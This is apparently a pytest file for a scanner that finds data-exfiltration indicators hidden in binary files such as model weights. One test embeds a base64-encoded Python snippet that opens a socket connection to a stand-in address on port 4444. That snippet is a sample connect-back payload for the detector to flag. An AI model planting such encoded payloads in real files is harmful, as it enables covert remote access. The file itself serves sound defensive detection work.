import base64
from pathlib import Path

from purser.core.findings import Severity
from purser.scanners.exfil import ExfilScanner


def test_exfil_indicators(exfil_binary: Path):
    findings = ExfilScanner().scan(exfil_binary)
    ids = {f.rule_id for f in findings}
    assert "EXFIL_WEBHOOK" in ids
    assert "EXFIL_SECRET" in ids
    assert "EXFIL_IP_ENDPOINT" in ids
    assert "EXFIL_CODE_INDICATOR" in ids


def test_benign_urls_ignored(tmp_path: Path):
    p = tmp_path / "meta.bin"
    p.write_bytes(b"\x00" * 16 + b"see https://huggingface.co/docs and https://github.com/org/repo" + b"\x00" * 16)
    findings = ExfilScanner().scan(p)
    assert not [f for f in findings if f.rule_id == "EXFIL_URL"]


def test_base64_payload_with_code():
    payload = base64.b64encode(
        b"import socket\ns=socket.socket()\ns.connect(('203.0.113.9',4444))\n" + b"#" * 20
    )
    data = b"\x00" * 8 + payload + b"\x00" * 8
    findings = ExfilScanner().scan_bytes(data)
    hits = [f for f in findings if f.rule_id == "EXFIL_ENCODED_PAYLOAD"]
    assert hits and hits[0].severity == Severity.CRITICAL


def test_random_weights_no_false_positives(tmp_path: Path):
    import random

    rng = random.Random(42)
    data = bytes(rng.randrange(256) for _ in range(512 * 1024))
    p = tmp_path / "w.bin"
    p.write_bytes(b"WGT0" + data)
    findings = [f for f in ExfilScanner().scan(p) if f.severity >= Severity.MEDIUM]
    assert not findings, f"false positives on random data: {[f.rule_id for f in findings]}"
